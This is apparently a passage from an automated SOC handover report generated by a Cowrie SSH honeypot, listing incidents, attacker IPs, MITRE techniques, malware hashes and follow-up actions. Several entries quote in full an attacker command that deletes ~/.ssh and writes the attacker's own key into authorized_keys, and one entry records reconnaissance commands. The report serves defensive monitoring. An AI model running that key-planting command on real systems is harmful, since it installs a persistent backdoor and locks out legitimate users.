| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:57:05` | `cowrie.session.connect` |
| `2026-04-18 14:57:05` | `cowrie.client.version` |
| `2026-04-18 14:57:05` | `cowrie.client.kex` |
| `2026-04-18 14:57:06` | `cowrie.login.success` |
| `2026-04-18 14:57:06` | `cowrie.session.params` |
| `2026-04-18 14:57:06` | `cowrie.command.input` |
| `2026-04-18 14:57:06` | `cowrie.command.failed` |
| `2026-04-18 14:57:06` | `cowrie.log.closed` |
| `2026-04-18 14:57:06` | `cowrie.session.params` |
| `2026-04-18 14:57:06` | `cowrie.command.input` |
| `2026-04-18 14:57:06` | `cowrie.session.file_download` |
| `2026-04-18 14:57:06` | `cowrie.log.closed` |
| `2026-04-18 14:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-348519d52767

| Field | Detail |
|---|---|
| **Source IP** | `183.110.116[.]87` |
| **First Seen** | 2026-04-18 14:57 |
| **Last Seen** | 2026-04-18 14:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:57:07` | `cowrie.session.connect` |
| `2026-04-18 14:57:07` | `cowrie.client.version` |
| `2026-04-18 14:57:07` | `cowrie.client.kex` |
| `2026-04-18 14:57:08` | `cowrie.login.success` |
| `2026-04-18 14:57:08` | `cowrie.session.params` |
| `2026-04-18 14:57:08` | `cowrie.command.input` |
| `2026-04-18 14:57:08` | `cowrie.command.failed` |
| `2026-04-18 14:57:08` | `cowrie.log.closed` |
| `2026-04-18 14:57:08` | `cowrie.session.params` |
| `2026-04-18 14:57:08` | `cowrie.command.input` |
| `2026-04-18 14:57:09` | `cowrie.session.file_download` |
| `2026-04-18 14:57:09` | `cowrie.log.closed` |
| `2026-04-18 14:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `183.110.116[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b3d3b46083

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 14:57 |
| **Last Seen** | 2026-04-18 14:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:57:08` | `cowrie.session.connect` |
| `2026-04-18 14:57:08` | `cowrie.client.version` |
| `2026-04-18 14:57:08` | `cowrie.client.kex` |
| `2026-04-18 14:57:08` | `cowrie.login.success` |
| `2026-04-18 14:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0211704435da

| Field | Detail |
|---|---|
| **Source IP** | `183.110.116[.]87` |
| **First Seen** | 2026-04-18 14:57 |
| **Last Seen** | 2026-04-18 14:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:57:11` | `cowrie.session.connect` |
| `2026-04-18 14:57:11` | `cowrie.client.version` |
| `2026-04-18 14:57:11` | `cowrie.client.kex` |
| `2026-04-18 14:57:11` | `cowrie.login.success` |
| `2026-04-18 14:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.110.116[.]87` to AbuseIPDB if not already reported
- [ ] Block `183.110.116[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28ad4a1b831a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 14:58 |
| **Last Seen** | 2026-04-18 14:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:58:49` | `cowrie.session.connect` |
| `2026-04-18 14:58:49` | `cowrie.client.version` |
| `2026-04-18 14:58:49` | `cowrie.client.kex` |
| `2026-04-18 14:58:49` | `cowrie.login.success` |
| `2026-04-18 14:58:49` | `cowrie.session.params` |
| `2026-04-18 14:58:49` | `cowrie.command.input` |
| `2026-04-18 14:58:49` | `cowrie.command.failed` |
| `2026-04-18 14:58:49` | `cowrie.log.closed` |
| `2026-04-18 14:58:49` | `cowrie.session.params` |
| `2026-04-18 14:58:49` | `cowrie.command.input` |
| `2026-04-18 14:58:50` | `cowrie.session.file_download` |
| `2026-04-18 14:58:50` | `cowrie.log.closed` |
| `2026-04-18 14:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1749b6eeb908

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 14:58 |
| **Last Seen** | 2026-04-18 14:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 14:58:51` | `cowrie.session.connect` |
| `2026-04-18 14:58:51` | `cowrie.client.version` |
| `2026-04-18 14:58:51` | `cowrie.client.kex` |
| `2026-04-18 14:58:51` | `cowrie.login.success` |
| `2026-04-18 14:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce69461bad5e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 15:12 |
| **Last Seen** | 2026-04-18 15:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 15:12:33` | `cowrie.session.connect` |
| `2026-04-18 15:12:33` | `cowrie.client.version` |
| `2026-04-18 15:12:33` | `cowrie.client.kex` |
| `2026-04-18 15:12:34` | `cowrie.login.success` |
| `2026-04-18 15:12:34` | `cowrie.session.params` |
| `2026-04-18 15:12:34` | `cowrie.command.input` |
| `2026-04-18 15:12:34` | `cowrie.command.failed` |
| `2026-04-18 15:12:34` | `cowrie.log.closed` |
| `2026-04-18 15:12:34` | `cowrie.session.params` |
| `2026-04-18 15:12:34` | `cowrie.command.input` |
| `2026-04-18 15:12:34` | `cowrie.session.file_download` |
| `2026-04-18 15:12:34` | `cowrie.log.closed` |
| `2026-04-18 15:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-264d9b247bea

| Field | Detail |
|---|---|
| **Source IP** | `165.154.149[.]253` |
| **First Seen** | 2026-04-18 15:12 |
| **Last Seen** | 2026-04-18 15:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 15:12:36` | `cowrie.session.connect` |
| `2026-04-18 15:12:36` | `cowrie.client.version` |
| `2026-04-18 15:12:36` | `cowrie.client.kex` |
| `2026-04-18 15:12:36` | `cowrie.login.success` |
| `2026-04-18 15:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.149[.]253` to AbuseIPDB if not already reported
- [ ] Block `165.154.149[.]253` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de86dedd7834

| Field | Detail |
|---|---|
| **Source IP** | `213.112.126[.]159` |
| **First Seen** | 2026-04-18 15:49 |
| **Last Seen** | 2026-04-18 15:50 |
| **Session Duration** | 50s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-18 15:49:50` | `cowrie.session.connect` |
| `2026-04-18 15:49:50` | `cowrie.client.version` |
| `2026-04-18 15:49:50` | `cowrie.client.kex` |
| `2026-04-18 15:49:51` | `cowrie.login.failed` |
| `2026-04-18 15:49:52` | `cowrie.login.success` |
| `2026-04-18 15:49:53` | `cowrie.session.params` |
| `2026-04-18 15:49:53` | `cowrie.command.input` |
| `2026-04-18 15:49:53` | `cowrie.command.failed` |
| `2026-04-18 15:49:53` | `cowrie.log.closed` |
| `2026-04-18 15:49:53` | `cowrie.session.params` |
| `2026-04-18 15:49:53` | `cowrie.command.input` |
| `2026-04-18 15:49:53` | `cowrie.log.closed` |
| `2026-04-18 15:49:54` | `cowrie.session.params` |
| `2026-04-18 15:49:54` | `cowrie.command.input` |
| `2026-04-18 15:49:54` | `cowrie.log.closed` |
| `2026-04-18 15:49:54` | `cowrie.session.params` |
| `2026-04-18 15:49:54` | `cowrie.command.input` |
| `2026-04-18 15:49:54` | `cowrie.log.closed` |
| `2026-04-18 15:49:55` | `cowrie.session.params` |
| `2026-04-18 15:49:55` | `cowrie.command.input` |
| `2026-04-18 15:49:55` | `cowrie.log.closed` |
| `2026-04-18 15:49:55` | `cowrie.session.params` |
| `2026-04-18 15:49:55` | `cowrie.command.input` |
| `2026-04-18 15:49:55` | `cowrie.log.closed` |
| `2026-04-18 15:49:56` | `cowrie.session.params` |
| `2026-04-18 15:49:56` | `cowrie.command.input` |
| `2026-04-18 15:49:56` | `cowrie.log.closed` |
| `2026-04-18 15:49:56` | `cowrie.session.params` |
| `2026-04-18 15:49:56` | `cowrie.command.input` |
| `2026-04-18 15:49:56` | `cowrie.log.closed` |
| `2026-04-18 15:49:57` | `cowrie.session.params` |
| `2026-04-18 15:49:57` | `cowrie.command.input` |
| `2026-04-18 15:49:57` | `cowrie.log.closed` |
| `2026-04-18 15:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.112.126[.]159` to AbuseIPDB if not already reported
- [ ] Block `213.112.126[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `165.154.149[.]253` | **19** | 2026-04-18 14:43 | 2026-04-18 15:12 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.21[.]179` | **9** | 2026-04-18 14:43 | 2026-04-18 14:53 | 15m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.110.116[.]87` | **6** | 2026-04-18 14:45 | 2026-04-18 14:59 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.183[.]253` | **2** | 2026-04-18 14:59 | 2026-04-18 15:01 | 2m | 0 | `T1592` | 🟢 LOW |
| `154.202.119[.]248` | 1 | 2026-04-18 14:43 | 2026-04-18 14:43 | 89s | 0 | `T1592` | 🟢 LOW |
| `8.219.93[.]189` | 1 | 2026-04-18 15:06 | 2026-04-18 15:06 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `180.76.183[.]253` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 1 |
| `213.112.126[.]159` | SE | Telenor Sverige AB | **100** ⚠️ | 0 |
| `165.154.149[.]253` | MY | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 4 |
| `14.103.21[.]179` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `183.110.116[.]87` | KR | Korea Telecom | **100** ⚠️ | 11 |
| `154.202.119[.]248` | US | Fastmos Co Limited | **100** ⚠️ | 9 |
| `8.219.93[.]189` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 0 |
| `175.147.202[.]60` | CN | CHINA UNICOM Liaoning province network | **52** | 0 |
| `103.146.110[.]249` | IN | Crisp Enterprises | **30** | 1 |
| `135.232.200[.]34` | US | Microsoft Limited | 9 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 53 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 25 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |

---

## 🔕 False Positive Summary (75 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 72 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 133 cases |
| Tool 34  | Credential Extractor        | ✅ 45 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 12 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 75 filtered (56.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 20 priority case(s) shown individually · 6 recon entry/entries in table (4 group(s) consolidating 36 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-18T16:48:10Z_
